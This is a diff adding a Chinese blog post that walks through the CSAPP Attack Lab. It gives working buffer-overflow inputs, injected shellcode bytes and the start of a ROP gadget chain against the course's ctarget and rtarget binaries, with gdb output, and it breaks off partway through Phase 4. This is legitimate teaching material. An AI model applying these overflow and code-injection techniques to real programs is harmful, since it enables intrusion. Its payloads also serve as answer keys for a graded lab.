@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>CSAPP深入理解计算机系统 Lab3(attack Lab) 详解 | LCJD BLOG# 页面title</title>
+  <meta name="description" content="本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。   实验说明 本实验通过向两个程序中进行攻击已达到攻击目的，通过这个实验能了解到通过缓冲区溢出的方法攻击程序的方法，同时对汇编代码、GDB和OBJDUMP等工具以及代码在机器中执行的过程的理解有更深的理解。 在动手实验之前需要仔细阅读实验说明,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP深入理解计算机系统 Lab3(attack Lab) 详解">
+<meta property="og:url" content="https://lcjd99.github.io/Course/csapp/Lab3/index.html">
+<meta property="og:site_name" content="凌晨九点空间">
+<meta property="og:description" content="本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。   实验说明 本实验通过向两个程序中进行攻击已达到攻击目的，通过这个实验能了解到通过缓冲区溢出的方法攻击程序的方法，同时对汇编代码、GDB和OBJDUMP等工具以及代码在机器中执行的过程的理解有更深的理解。 在动手实验之前需要仔细阅读实验说明,">
+<meta property="og:locale">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-217ebf4b5c8832f3762d154634397080.png">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-6975107c9128a0bdfaa89c47fef8c7db.png">
+<meta property="article:published_time" content="2023-10-21T14:51:47.000Z">
+<meta property="article:modified_time" content="2024-04-12T15:34:46.881Z">
+<meta property="article:author" content="凌晨九点">
+<meta property="article:tag" content="C">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic4.zhimg.com/80/v2-217ebf4b5c8832f3762d154634397080.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lcjd99.github.io/Course/csapp/Lab3/index.html">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    <link href="//cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet">
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="凌晨九点空间" type="application/atom+xml">
+</head>
+
+
+<body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/LCJD99" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">凌晨九点</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CS Student</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/LCJD99" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CS61C/">CS61C</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP/">CSAPP</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%80%83%E7%A0%94/">考研</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Computer-Organization/" rel="tag">Computer Organization</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux-Network/" rel="tag">Linux Network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/utils/" rel="tag">utils</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/C/" style="font-size: 14px;">C</a> <a href="/tags/Computer-Organization/" style="font-size: 13px;">Computer Organization</a> <a href="/tags/Linux-Network/" style="font-size: 13px;">Linux Network</a> <a href="/tags/utils/" style="font-size: 13px;">utils</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E8%80%83%E7%A0%94/">考研</a>
+              </p>
+              <p class="item-title">
+                <a href="/Postgraduate/CS/Organization/Lecture2/" class="title">【考研】计组 （二）： 数据的表示和运算</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-04-12T14:51:47.000Z" itemprop="datePublished">2024-04-12</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Linux/">Linux</a>
+              </p>
+              <p class="item-title">
+                <a href="/Linux/concurrent-in-linux/" class="title">Linux中对网络并发处理的技术</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-04-10T09:15:47.000Z" itemprop="datePublished">2024-04-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/git/">git</a>
+              </p>
+              <p class="item-title">
+                <a href="/utils/git-1/" class="title">git 入门教程（一）：基本用法</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-04-09T14:50:47.000Z" itemprop="datePublished">2024-04-09</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/others/">others</a>
+              </p>
+              <p class="item-title">
+                <a href="/others/c-format-output/" class="title">C语言格式化输出问题</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-04-04T14:51:47.000Z" itemprop="datePublished">2024-04-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/CS61C/">CS61C</a>
+              </p>
+              <p class="item-title">
+                <a href="/Course/cs61c/Lab2/" class="title">【CS61C】Lab2 实验解析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-04-04T14:51:47.000Z" itemprop="datePublished">2024-04-04</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Course/csapp/Lab3" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CSAPP深入理解计算机系统 Lab3(attack Lab) 详解
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/Course/csapp/Lab3/" class="article-date">
+	  <time datetime="2023-10-21T14:51:47.000Z" itemprop="datePublished">2023-10-21</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/CSAPP/">CSAPP</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/C/" rel="tag">C</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/Course/csapp/Lab3/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3.4k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 14(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <blockquote>
+<p>本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。</p>
+</blockquote>
+<h2 id="实验说明"><a class="markdownIt-Anchor" href="#实验说明"></a> 实验说明</h2>
+<p>本实验通过向两个程序中进行攻击已达到攻击目的，通过这个实验能了解到通过缓冲区溢出的方法攻击程序的方法，同时对汇编代码、<code>GDB</code>和<code>OBJDUMP</code>等工具以及代码在机器中执行的过程的理解有更深的理解。</p>
+<p>在动手实验之前需要仔细阅读<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验说明</a>, 本实验可以在实验说明的引导下顺利完成。</p>
+<p>实验中主要包括两个可执行程序<code>ctarget</code>和<code>rtarget</code>，两个可执行程序都会从标准输入中读入一个字符串在缓冲区中，但是并不会检测是否会出现缓冲区溢出。但是程序会在反馈信息中表示是否出现缓冲区溢出。同时还有一个工具<code>HEX2RAW</code>，是为了方便我们将二进制代码(16进制表示方式)变成对应的ascii码串作为可执行程序的输入</p>
+<p>其中有一些需要说明的重点：</p>
+<ul>
+<li>在企图植入的代码中不应该包含<code>0x0a</code>，因为这在ascii中代表换行符，而实验中是按行读取</li>
+<li><code>HEX2RAW</code> 要按照小端序的方式写入，并且都要补齐两位。</li>
+</ul>
+<h3 id="一点小坑"><a class="markdownIt-Anchor" href="#一点小坑"></a> 一点小坑</h3>
+<p>出现报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAILED: Initialization error: Running on an illegal host</span><br></pre></td></tr></table></figure>
+<p>由于我们无法连接到CMU的服务器，所以通常的执行方法会导致程序卡在等待服务器响应上，因此每次执行都需要带上<code>-q</code>的参数离线执行。</p>
+<h2 id="实验具体流程"><a class="markdownIt-Anchor" href="#实验具体流程"></a> 实验具体流程</h2>
+<h3 id="part1-level1-phase-1"><a class="markdownIt-Anchor" href="#part1-level1-phase-1"></a> Part1 Level1 (Phase 1)</h3>
+<p>这是一个热身实验，目标是让程序执行到一个目标位置的函数<code>touch1</code>。对于本题的思路如下：</p>
+<p>首先我们需要知道<code>touch1</code>的的地址便于我们写入栈中，可以通过<code>objdump -d &gt; source.S</code>的方式找到其位置(文本编辑器的查找),查找到如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 g     F .text  000000000000002c  touch1</span><br></pre></td></tr></table></figure>
+<p>说明touch1的位置在<code>0x4017c0</code>的位置。我们的目标就是将这个地址放在栈记录函数返回值的地方，并在函数<code>getbuf</code>调用<code>ret</code>时进入这个部分代码。</p>
+<p>然后我们需要知道<code>buffer</code>的大小，这里需要查看<code>getbuf</code>的代码，在Lab2中我主要通过阅读<code>objdump -t</code>的逆向汇编解题，这次我主要通过<code>gdb</code>来完成。我们执行<code>gdb ctarget</code>并直接<code>b getbuf</code>设置断点,然后<code>r -q</code>执行到断点位置。接着执行汇编如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;:	sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>在这里能看到实际上分配的空间为<code>0x28B</code>。并且不会做缓冲区溢出的验证，我们可以先任意填充数据将缓存区填满，并在继续填写将返回值修改为<code>0x00000000004017c0</code>。但是需要注意的是小端序的存储方式，我们可以将数据以16进制的格式写入一个文本文件，便于  <code>HEX2RAW</code> 转换为我们需要的数据。我填写的数据在<code>key_1.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>使用如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1</span><br></pre></td></tr></table></figure>
+<h3 id="part1-level2-phase-2"><a class="markdownIt-Anchor" href="#part1-level2-phase-2"></a> Part1 Level2 (Phase 2)</h3>
+<p>这个部分的可以看到汇编代码中有如下部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004017fc &lt;+16&gt;:    cmp    0x202ce2(%rip),%edi  # 0x6044e4 &lt;cookie&gt;</span><br></pre></td></tr></table></figure>
+<p>直接给出了所需要比较的值<code>cookie</code>的位置，直接用gdb打印出结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x 0x6044e4</span><br><span class="line">0x6044e4 &lt;cookie&gt;:      0x59b997fa</span><br></pre></td></tr></table></figure>
+<p>现在的目标就变成如何将这个值写入到寄存器<code>rdi</code>中，根据提示信息我们不要使用除<code>ret</code>以外的其他跳转指令，所以就要借助栈即存储地址又存储指令。我们可以将将示意图表示如下</p>
+<p><img src="https://pic4.zhimg.com/80/v2-217ebf4b5c8832f3762d154634397080.png" alt="Image" /></p>
+<p>因为我们只能通过输入字符串的方式去攻击，所以我们能做的就是将函数返回地址改为栈中下一行的地址(这里的索引为示例，实际情况中栈的地址是向下增长的)，并将下一行作为注入函数的代码段，同时记得再将返回地址利用<code>mov</code>写入栈中，并将<code>rsp</code>寄存器移动到相应地方以利用<code>ret</code>进入<code>touch2</code>。</p>
+<p>我的注入代码段如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">add $0x4, %rsp &quot; 通过后续代码长度计算需要加的长度,0x4是标记一下位置，方便找</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>将上述代码保存在<code>a.S</code>中，并执行	用于生成二进制代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   48 83 c4 04             add    $0x4,%rsp</span><br><span class="line">   b:   c3                      ret</span><br></pre></td></tr></table></figure>
+<p>这段代码中我们能看出我们需要将<code>rsp</code>移动<code>b + 1</code>也就是<code>c</code>，寻找<code>touch2</code>函数的地址方式见上一题，最终注入为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">a8 dc 61 55 00 00 00 00   //下一行的地址</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">48 83 c4 0c         </span><br><span class="line">c3</span><br><span class="line">ec 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
+<p>执行结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2</span><br></pre></td></tr></table></figure>
+<h3 id="part1-level3-phase-3"><a class="markdownIt-Anchor" href="#part1-level3-phase-3"></a> Part1 Level3 (Phase 3)</h3>
+<p>本题和上一题的区别不大，仅仅是改为注入一个字符串指针作为参数，我们可以将字符串的值存在栈中，而将参数传回，具体操作过程如下</p>
+<p><img src="https://pic4.zhimg.com/80/v2-6975107c9128a0bdfaa89c47fef8c7db.png" alt="Image" /></p>
+<p>注入的代码段和上一题格式相同，需要修改的参数是<code>rdi</code>的值应该为上图栈中第5行的部分。</p>
+<p>首先我们需要知道字符串的值如下，这里我们直接利用<code>gdb</code>，我们先像第一个题一样直接将返回地址设置为<code>touch3</code>，并在<code>touch3</code>处设置断点开始执行，并单步调试到<code>mov    0x202bd3(%rip),%edi</code>后直接通过<code>p/x $edi</code>打印出其值为<code>0x59b997fa</code>，我们知道<code>$rdi</code>和<code>$rsi</code>作为参数传递给函数<code>hexmatch</code>中，通过<code>disas hexmatch</code>可以发现，该函数实际上通过<code>__sprintf_chk</code>这个库函数将<code>$edi</code>的值格式化为字符串，具体格式为<code>&quot;%.8x&quot;</code>表示以16进制方式转换，也就是是说转换后的字符串为<code>&quot;59b997fa&quot;</code>，说明我们需要在上图6的位置添入的就是这个字符串，字符串序列为<code>35 39 62 39 39 37 66 61 00</code>注意字符串末尾的 <code>00</code></p>
+<p>编写汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x22222222, %rsp</span><br><span class="line">mov $0x22222222, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>其中的数后续根据具体地址修改</p>
+<p>编译并反汇编后得到如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c4 22 22 22 22    mov    $0x22222222,%rsp</span><br><span class="line">   7:   48 c7 c7 22 22 22 22    mov    $0x22222222,%rdi</span><br><span class="line">   e:   c3                      ret</span><br></pre></td></tr></table></figure>
+<p>我们可以根据上述地址加以修改，<code>gdb</code>中断点在<code>getbuf</code>处查看栈指针位置为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$3</span> = (void *) 0x5561dca0</span><br></pre></td></tr></table></figure>
+<p>说明写入的位置在 <code>0x5561dca0 + 0x8 + 0xe = 0x5561dcb7</code> 和 <code>0x5561dcb7 + 0x8 = 0x5561dcbf</code>，这样就可以得出最终的代码二进制代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">a8 dc 61 55 00 00 00 00</span><br><span class="line">48 c7 c4 b7 dc 61 55</span><br><span class="line">48 c7 c7 bf dc 61 55</span><br><span class="line">c3</span><br><span class="line">fa 18 40 00 00 00 00 00 //touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 //string</span><br></pre></td></tr></table></figure>
+<p>运行结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3</span><br></pre></td></tr></table></figure>
+<h3 id="part2-level2-phase-4"><a class="markdownIt-Anchor" href="#part2-level2-phase-4"></a> Part2 Level2 (Phase 4)</h3>
+<p>在第二部分中程序进行了增强，具体如下：</p>
+<ol>
+<li>栈的地址进行了随机化，意味着无法再直接确定攻击的地址</li>
+<li>内存中为栈分配的空间没有了执行权限，意味着无法注入代码段在栈中</li>
+</ol>
+<p>但是我们“小工具“可以通过其原有代码的部分代码段作为我们执行的二进制代码，从而产生我们需要的效果。<strong>这里的小工具实际上是一个函数的最后部分，执行这个片断的代码并返回栈中，继续<code>ret</code>到栈中下一行所指向的代码,由于在此其间并没有call过这个函数，栈中的数据并不会被破坏修改，从而能按照栈中的地址一步步执行</strong>。</p>
+<p>在这个部分我们需要在这个限制条件下重新入侵到<code>Phase 2</code>函数中，并给予限制如下：</p>
+<ol>
+<li>解决方案需要使用小工具的方式实现</li>
+<li>只能使用到前八个寄存器</li>
+<li>限制使用的指令为<code>movq popq ret nop</code></li>
+</ol>
+<p>实际上看上去是一些限制其实也是一些提示，帮助我们减少检索指令的范围。同时所有可能用到的指令都作为附件放在文档的最后，大家做的时候应该仔细查阅。</p>
+<p><strong>接下来开始实验的过程</strong></p>
+<p>首先将汇编代码保存本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d rtarget &gt; rtarget.S</span><br></pre></td></tr></table></figure>
+<p>按照要求找到<code>start_farm</code> 和 <code>mid_farm</code>之间的汇编代码。根据需求，我们需要修改<code>%rdi</code>寄存器的值，并将执行的<code>PC</code>跳转到<code>touch2</code>函数的位置。首先查看cookie的值（方法同<code>Phase 2</code>）为<code>0x59b997fa</code> 。现在需要将这个值放入栈中并在小工具中将<code>popq</code>到某个寄存器中，在执行寄存器<code>movq</code>指令即可。</p>
+<p>观察工具代码部分有如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>这里最后的<code>58 90 c3</code> 分别对应三个指令<code>popq %rax</code> 、<code>nop</code> 、<code>ret</code>，所以我们可以在栈中存放同上面的值<code>0x59b997fa</code> 将其移动到<code>%rax</code>中。</p>
+<p>接下来我们抱着目的性的找<code>movq %rax %rdi</code> , 也就是<code>48 89 c7</code>观察以下函数满足规则发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>因此这个栈中的代码放置应该如下</p>
